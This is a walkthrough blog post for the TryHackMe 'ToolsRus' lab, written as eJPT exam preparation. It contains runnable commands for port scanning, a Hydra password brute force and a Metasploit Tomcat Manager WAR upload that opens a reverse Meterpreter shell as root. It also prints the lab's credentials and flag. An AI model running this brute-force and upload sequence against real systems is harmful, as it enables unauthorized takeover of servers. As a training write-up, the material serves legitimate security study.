---
title: "ToolsRus"
date: 2026-01-08
draft: false
description: "Walkthrough of ToolsRus from TryHackMe. Web enumeration, HTTP brute force with Hydra, Tomcat Manager exploitation with Metasploit — eJPT preparation."
tags:
  [
    "walkthrough",
    "tryhackme",
    "ejpt",
    "linux",
    "tomcat",
    "hydra",
    "metasploit",
    "bruteforce",
    "web",
  ]
categories: ["Walkthroughs"]
series: ["Road to eJPTv2"]
ShowToc: true
TocOpen: false
weight: 10
---

## Summary

**ToolsRus** is the tenth machine of the _Road to eJPTv2_ series. A machine that combines web enumeration across multiple ports, brute force against HTTP Basic Auth, and Tomcat Manager exploitation via Metasploit — resulting in direct root access without needing a separate privilege escalation step.

An attack flow that mirrors real-world scenarios where credential reuse between services is the primary vector.

| Attribute      | Value                                                  |
| -------------- | ------------------------------------------------------ |
| **Platform**   | TryHackMe                                              |
| **Difficulty** | Easy                                                   |
| **OS**         | Linux (Ubuntu)                                         |
| **Room**       | [ToolsRus](https://tryhackme.com/room/toolsrus)        |
| **Skills**     | Web Enum, HTTP Brute Force, Tomcat Manager, Metasploit |

### 🎥 Video Walkthrough

{{< youtube id="1uWq4z6NwTM" start="1" >}}

> If you prefer to follow the walkthrough step by step, keep reading. The video covers the same process in visual format.

### Tools Used

- `nmap` — port scanning and version detection
- `whatweb` — web fingerprinting
- `gobuster` — web directory fuzzing
- `hydra` — HTTP Basic Auth brute force
- `nikto` — web vulnerability scanner
- `metasploit` — Tomcat Manager exploitation

### Solution Overview

1. **Recon:** nmap reveals four ports — SSH, HTTP (80), Tomcat (1234) and AJP (8009).
2. **Web enum (80):** gobuster finds `/guidelines` with a username (`bob`) and `/protected` with HTTP Basic Auth.
3. **Brute force:** Hydra uses rockyou.txt to crack `/protected/` with `bob:bubbles`.
4. **Tomcat enum (1234):** gobuster finds `/manager`. Nikto confirms the Tomcat admin panel.
5. **Exploitation:** Metasploit (`tomcat_mgr_upload`) uses credentials `bob:bubbles` to upload a malicious WAR and get a Meterpreter session as root.
6. **Root flag:** Direct access to `/root/flag.txt`.

---

## Reconnaissance

### Ping

We verify connectivity and identify the OS by TTL:

```bash
ping -c 1 10.64.183.216
```

```
64 bytes from 10.64.183.216: icmp_seq=1 ttl=62 time=69.2 ms
```

TTL 62 → Linux (original value is 64, decremented through network hops).

### Nmap — Port Scan

```bash
nmap 10.64.183.216 -n -Pn -sS -p- --open --min-rate=5000 -oG allTCPports
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1234/tcp open  hotline
8009/tcp open  ajp13
```

Four open ports — more surface than the previous machine. Ports 1234 and 8009 are non-standard and deserve special attention.

### Nmap — Versions and Scripts

```bash
nmap 10.64.183.216 -n -Pn -sS -p22,80,1234,8009 -sVC --min-rate=5000 -oN scantoolsrus.txt
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
```

Key findings:

- Port 80: Standard Apache 2.4.18
- **Port 1234: Apache Tomcat 7.0.88** — primary target
- Port 8009: AJP13 (Tomcat's internal communication protocol)

### Whatweb

```bash
whatweb http://10.64.183.216
```

```
http://10.64.183.216 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], IP[10.64.183.216]
```

Confirms Apache 2.4.18 on port 80 without additional relevant information.

### Web Fuzzing (port 80) — gobuster

```bash
gobuster dir -u http://10.64.183.216 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,css,xml,bak -t 50
```

```
/index.html    (Status: 200) [Size: 168]
/guidelines    (Status: 301)
/protected     (Status: 401) [Size: 460]
```

Two important findings:

- `/guidelines` — public content with information about users
- `/protected` — directory with **HTTP Basic Auth** (401 status code)

Accessing `/guidelines` we find a reference to user **bob**.

### Brute Force — Hydra against HTTP Basic Auth

With user `bob` and `/protected/` identified, we launch Hydra against the basic authentication:

```bash
hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.64.183.216 http-get /protected/
```

```
[80][http-get] host: 10.64.183.216   login: bob   password: bubbles
```

Credentials obtained: `bob:bubbles`

### Web Fuzzing (port 1234) — gobuster

We enumerate Tomcat on the non-standard port:

```bash
gobuster dir -u http://10.64.183.216:1234 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,css,xml,bak -t 50
```

```
/docs       (Status: 302)
/examples   (Status: 302)
/manager    (Status: 302)
```

`/manager` is the Tomcat admin panel — the exploitation target.

### Nikto — Tomcat Manager Reconnaissance

```bash
nikto -host http://10.64.183.216:1234/manager/html
```

Nikto confirms the Tomcat admin interface at `/manager/html`, and also detects dangerous HTTP methods enabled (`PUT`, `DELETE`) and exposed documentation. The Tomcat Manager with valid credentials allows uploading WAR applications — a classic RCE vector.

---

## Exploitation

### Metasploit — tomcat_mgr_upload

The `exploit/multi/http/tomcat_mgr_upload` Metasploit module uploads a malicious WAR file through the Tomcat Manager and executes it to get a reverse shell.

```bash
msfconsole -q
msf > use exploit/multi/http/tomcat_mgr_upload
```

We configure the options with the credentials obtained from Hydra:

```bash
msf exploit(multi/http/tomcat_mgr_upload) > set HttpUsername bob
msf exploit(multi/http/tomcat_mgr_upload) > set HttpPassword bubbles
msf exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 10.64.183.216
msf exploit(multi/http/tomcat_mgr_upload) > set RPORT 1234
msf exploit(multi/http/tomcat_mgr_upload) > set LHOST <YOUR_IP>
msf exploit(multi/http/tomcat_mgr_upload) > exploit
```

```
[*] Started reverse TCP handler on <YOUR_IP>:4444
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying WAR payload...
[*] Executing payload...
[*] Meterpreter session 1 opened

meterpreter > getuid
Server username: root
```

Direct access as **root** — the credentials from `/protected/` were the same as the Tomcat Manager credentials.

---

## Post-Exploitation

### Interactive Shell

```bash
meterpreter > shell
Process 1 created.
Channel 1 created.
whoami
root
```

### Root Flag

```bash
cd /root
cat flag.txt
ff1fc4a81affcc7688cf89ae7dc6e0e1
```

> **Root flag:** `ff1fc4a81affcc7688cf89ae7dc6e0e1`

There is no separate user flag — the Tomcat exploit delivers root access directly.

---

## Lessons Learned

- **Non-standard ports deserve the same enumeration depth** — Tomcat on port 1234 would have gone unnoticed in a quick scan. Always scan all ports with `-p-`.
- **Public directories with information are valuable clues** — `/guidelines` exposed the username `bob`. Enumerate all web content before moving to exploitation.
- **HTTP 401 is not a dead end** — A 401 status means there's something worth attacking behind it. Identify the authentication type (basic, digest, form) and apply brute force with the right wordlists.
- **Credential reuse between services is very common** — `bob:bubbles` worked for both `/protected/` and the Tomcat Manager. In post-exploitation, always try found credentials against all available services.
- **Tomcat Manager = guaranteed RCE with valid credentials** — The Tomcat admin panel allows uploading WAR files. With manager access, full server compromise is trivial. Metasploit has a dedicated module for this.
- **Nikto complements gobuster** — While gobuster finds directories, nikto analyzes server configuration and detects issues like dangerous HTTP methods or exposed interfaces.

### For the eJPT

| Concept                       | eJPT Relevance                          |
| ----------------------------- | --------------------------------------- |
| Multi-port enumeration        | Complete scanning required in the exam  |
| HTTP Basic Auth + brute force | Common web authentication scenario      |
| Apache Tomcat Manager         | Target service in web application labs  |
| Metasploit tomcat_mgr_upload  | Web exploitation module in the syllabus |

**Approximate completion time:** 30-40 minutes.

---

## References

- [ToolsRus — TryHackMe](https://tryhackme.com/room/toolsrus)
- [Metasploit — tomcat_mgr_upload](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/)
- [Apache Tomcat Manager exploitation](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat)
- [Nikto](https://github.com/sullo/nikto)
